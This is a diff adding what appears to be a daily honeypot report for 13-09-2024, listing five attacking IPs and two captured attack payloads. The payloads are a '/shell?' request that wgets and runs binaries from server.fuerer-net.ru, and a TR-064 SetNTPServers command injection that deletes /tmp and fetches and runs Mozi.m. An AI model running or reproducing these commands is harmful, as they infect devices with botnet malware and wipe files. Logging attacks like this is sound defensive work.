@@ -1,0 +1,28 @@
+Top 5 IPs for 13-09-2024 :
+
+134.209.153.200
+218.245.5.178
+13.53.216.101
+14.58.14.151
+42.112.150.100
+
+
+Malware Observed:
+
+None observed
+
+
+Commands/exploits observed :
+
+/shell?cd+/tmp;rm+arm+arm7;wget+http:/\\/server.fuerer-net.ru/fquoqU/dvwkja7;chmod+777+dvwkja7;./dvwkja7+ipcams.arm7;wget+http:/\\/server.fuerer-net.ru/fquoqU/wkjbefps;chmod+777+wkjbefps;./wkjbefps+ipcams.mips;wget+http:/\\/server.fuerer-net.ru/fquoqU/fjwwofba5;chmod+777+fjwwofba5;./fjwwofba5+ipcams.arm5;wget+http:/\\/server.fuerer-net.ru/fquoqU/kjsusa6;chmod+777+kjsusa6;./kjsusa6+ipcams.arm6;wget+http:/\\/server.fuerer-net.ru/fquoqU/wheiuwa4;chmod+777+wheiuwa4;./wheiuwa4+ipcams.arm4
+
+
+
+POST /UD/act?1 HTTP/1.1
+Host: 127.0.0.1:7574
+User-Agent: Hello, world
+SOAPAction: urn:dslforum-org:service:Time:1#SetNTPServers
+Content-Type: text/xml
+Content-Length: 640
+
+<?xml version="1.0"?><SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><SOAP-ENV:Body><u:SetNTPServers xmlns:u="urn:dslforum-org:service:Time:1&qu ot;><NewNTPServer1>`cd /tmp && rm -rf * && /bin/busybox wget http://117.247.180.66:54668/Mozi.m && chmod 777 /tmp/tr064 && /tmp/tr064 tr064`</NewNTPServer1><NewNTPServer2>`echo DEATH`</NewNTPServer2><NewNTPServer3>`echo DEATH`</NewNTPServer3><NewNTPServer4>`echo DEATH`</NewNTPServer4><NewNTPServer5>`echo DEATH`</NewNTPServer5></u:SetNTPServers></SOAP-ENV:Body></SOAP-ENV:Envelope>
